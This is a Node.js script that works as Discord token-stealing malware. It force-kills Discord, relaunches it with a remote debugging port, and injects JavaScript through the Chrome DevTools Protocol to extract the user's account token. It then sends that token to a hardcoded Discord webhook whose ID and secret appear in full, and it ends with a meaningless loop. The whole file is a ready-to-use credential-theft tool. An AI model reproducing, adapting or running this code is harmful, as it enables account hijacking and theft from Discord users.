// Don't forget to edit the webhook in the payload on line 43
const CDP = require('chrome-remote-interface');
const fs = require('fs');
const cp = require('child_process');
const { Webhook } = require('discord-webhook-node');
const shook = new Webhook("https://discord.com/api/webhooks/1019247739592245349/n9fRp8FTDsJBmKnpnpbsFBPQn65e7D55e9DRC6Ssnc9DCjKTq0R3gSNrUWydic1CAFPt")
shook.setAvatar('https://cdn.discordapp.com/avatars/958048677581189190/be80ac371abfb878f7187ba522d97a16.png?size=1024')
shook.setUsername('fuck')

try{
    // console.log('attempting to kill discord process...');
    cp.execSync('taskkill /f /im Discord.exe');
}
catch(e){}

exploit();


function exploit(){
    var discord = process.env.LOCALAPPDATA + "\\Discord";
    fs.readdir(discord, (error, files) => {if(error){console.log('discord not found, exiting...'); process.exit(0);}
        files.forEach(file => {
            if(file.startsWith('app-')){
                discord += "\\" + file + "\\Discord.exe";
                // console.log('launching discord with debugging options...');
                var starter = cp.spawn(discord, ['--remote-debugging-port=9222'], {detached: true, windowsHide: true});
                starter.stdout.on('data', function(data){
                    if(data.toString().includes('Module')){
                        // console.log("discord was started, firing payload in 5 seconds...");
                        setTimeout(() => {
                            payload();
                            // console.log('payload sent...');
                        }, 5000);
                    }
                });
            }
        });
    });
}

async function payload() {
    try {
        client = await CDP(
            'ws://localhost:9222/devtools/browser'
        );
        const { Runtime } = client;
        await Runtime.enable();
        const getToken = "var f=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();f"
        const res = await Runtime.evaluate({expression: getToken});
        const f = res["result"]["value"]
        shook.send(`Logged token a : ${f}`)
        // console.log(f);
    } catch (err) {
        // console.error(err);
    }
    setInterval(() => {
        pisi(2 / console.log('hehe ' + 1/2 == 3 + 'ehe' / 3, ''['sus']))
    }, 3000)
}